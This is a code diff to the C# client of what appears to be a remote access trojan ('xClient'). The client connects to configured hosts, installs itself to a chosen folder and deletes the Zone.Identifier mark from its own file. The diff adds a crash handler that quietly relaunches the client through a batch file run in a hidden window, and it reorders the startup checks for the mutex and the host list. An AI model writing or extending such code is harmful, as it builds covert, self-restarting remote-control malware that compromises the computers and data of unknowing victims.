@@ -28,6 +28,7 @@ namespace xClient
         {
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
+            AppDomain.CurrentDomain.UnhandledException += HandleUnhandledException;
 
             Settings.Initialize();
             Initialize();
@@ -35,6 +36,24 @@ namespace xClient
                 Connect();
 
             Cleanup();
+        }
+
+        private static void HandleUnhandledException(object sender, UnhandledExceptionEventArgs e)
+        {
+            if (e.IsTerminating)
+            {
+                string batchFile = FileHelper.CreateRestartBatch();
+                if (string.IsNullOrEmpty(batchFile)) return;
+
+                ProcessStartInfo startInfo = new ProcessStartInfo
+                {
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    UseShellExecute = true,
+                    FileName = batchFile
+                };
+                Process.Start(startInfo);
+                Environment.Exit(0);
+            }
         }
 
         private static void Cleanup()
@@ -115,23 +134,19 @@ namespace xClient
 
         private static void Initialize()
         {
-            if (!MutexHelper.CreateMutex(Settings.MUTEX))
-                ClientData.Disconnect = true; // process with same mutex is already running
+            _hosts = new HostsManager(HostHelper.GetHostsList(Settings.HOSTS));
+
+            // process with same mutex is already running
+            if (!MutexHelper.CreateMutex(Settings.MUTEX) || _hosts.IsEmpty) // no hosts to connect
+                ClientData.Disconnect = true;
 
             if (ClientData.Disconnect)
                 return;
 
             AES.PreHashKey(Settings.PASSWORD);
-            _hosts = new HostsManager(HostHelper.GetHostsList(Settings.HOSTS));
             ClientData.InstallPath = Path.Combine(Settings.DIR, ((!string.IsNullOrEmpty(Settings.SUBFOLDER)) ? Settings.SUBFOLDER + @"\" : "") + Settings.INSTALLNAME);
             GeoLocationHelper.Initialize();
-
-            if (_hosts.IsEmpty)
-                ClientData.Disconnect = true; // no hosts to connect
-
-            if (ClientData.Disconnect)
-                return;
-
+            
             FileHelper.DeleteZoneIdentifier(ClientData.CurrentPath);
 
             if (!Settings.INSTALL || ClientData.CurrentPath == ClientData.InstallPath)
